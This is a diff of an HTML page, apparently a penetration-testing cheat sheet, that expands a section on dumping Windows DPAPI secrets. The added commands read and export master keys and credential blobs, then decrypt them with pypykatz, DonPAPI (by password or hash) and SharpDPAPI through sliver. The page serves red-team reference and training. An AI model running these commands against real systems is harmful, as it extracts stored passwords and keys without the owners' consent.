@@ -324,17 +324,45 @@ body.dark-mode #dynamicFormContainer button:hover {
     background: #424242;
 }
 </style>
-  <h3 id="abuse-1-auto-dump-from-linux">Abuse #1: Auto dump (From Linux)</h3>
+  <h3 id="abuse-1-credentials-dump-from-linux">Abuse #1: Credentials dump (From Linux)</h3>
 <p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
+<button data-tabset="set1" data-tabcontent="tab1" >pypykatz</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">DonPAPI collect -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -t &lt;TARGET&gt;
+<button data-tabset="set1" data-tabcontent="tab2" >DonPAPI</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-info-gathering">1. Info Gathering</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cmd /c &#34;dir /S /AS C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Protect &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect&#34;
+</span></span></span></code></pre></div><h4 id="2-retrieve-keys">2. Retrieve Keys</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get master key
+</span></span><span class="line"><span class="cl"><span class="go">certutil -encode &#34;C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;MASTERKEY&gt;&#34; C:\ProgramData\&lt;MASTERKEY&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste to <span class="nb">local</span> Linux
+</span></span><span class="line"><span class="cl"><span class="go">type C:\ProgramData\&lt;MASTERKEY&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Base64 decode
+</span></span><span class="line"><span class="cl"><span class="go">cat masterkey_b64 | base64 -d &gt; masterkey_file
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get credential
+</span></span><span class="line"><span class="cl"><span class="go">certutil -encode &#34;C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Credentials\&lt;CREDENTIALS_HASH&gt;&#34; C:\ProgramData\&lt;CREDENTIALS_HASH&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste to <span class="nb">local</span> Linux
+</span></span><span class="line"><span class="cl"><span class="go">type C:\ProgramData\&lt;CREDENTIALS_HASH&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Base64 decode
+</span></span><span class="line"><span class="cl"><span class="go">cat credential_b64 | base64 -d &gt; credential_file
+</span></span></span></code></pre></div><h4 id="3-decrypt-credentials">3. Decrypt credentials</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi prekey password &lt;SID&gt; &#39;&lt;PASSWORD&gt;&#39; | tee pkf
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi masterkey masterkey_file pkf -o mkf
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi credential mkf credential_file
+</span></span></span></code></pre></div></div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
+</span></span><span class="line"><span class="cl"><span class="go">DonPAPI collect -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -t &lt;TARGET&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl"><span class="go">DonPAPI collect -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -H &lt;HASH&gt; -t &lt;TARGET&gt;
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/login-securite/DonPAPI">DonPAPI</a></em></small></p></div></p>
-<h3 id="abuse-1-auto-dump-from-windows">Abuse #1: Auto dump (From Windows)</h3>
+<h3 id="abuse-1-credentials-dump-from-windows">Abuse #1: Credentials dump (From Windows)</h3>
 <p>
-<button data-tabset="set2" data-tabcontent="tab1" class="active">mimikatz</button>
+<button data-tabset="set2" data-tabcontent="tab1" >mimikatz</button>
 
 <button data-tabset="set2" data-tabcontent="tab2" >SharpDPAPI</button>
+
+<button data-tabset="set2" data-tabcontent="tab3" >sliver</button>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-info-gathering">1. Info Gathering</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cmd /c &#34;dir /S /AS C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Protect &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect&#34;
@@ -839,11 +867,19 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SharpDPAPI completed in 00:00:00.1707869
+</span></span></span></code></pre></div></div>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab3"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as system
+</span></span><span class="line"><span class="cl"><span class="go">sharpdpapi -- &#39;machinetriage&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as user
+</span></span><span class="line"><span class="cl"><span class="go">sharpdpapi -- &#39;credentials /password:&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as user <span class="o">(</span>without password<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">sharpdpapi -- &#39;credentials /rpc&#39;
 </span></span></span></code></pre></div></div></p>
 <hr>
 <h3 id="abuse-2-browser-saved-creds">Abuse #2: Browser Saved Creds</h3>
 <p>
-<button data-tabset="set3" data-tabcontent="tab1" class="active">Offline</button>
+<button data-tabset="set3" data-tabcontent="tab1" >Offline</button>
 
 <button data-tabset="set3" data-tabcontent="tab2" >Auto</button>
 
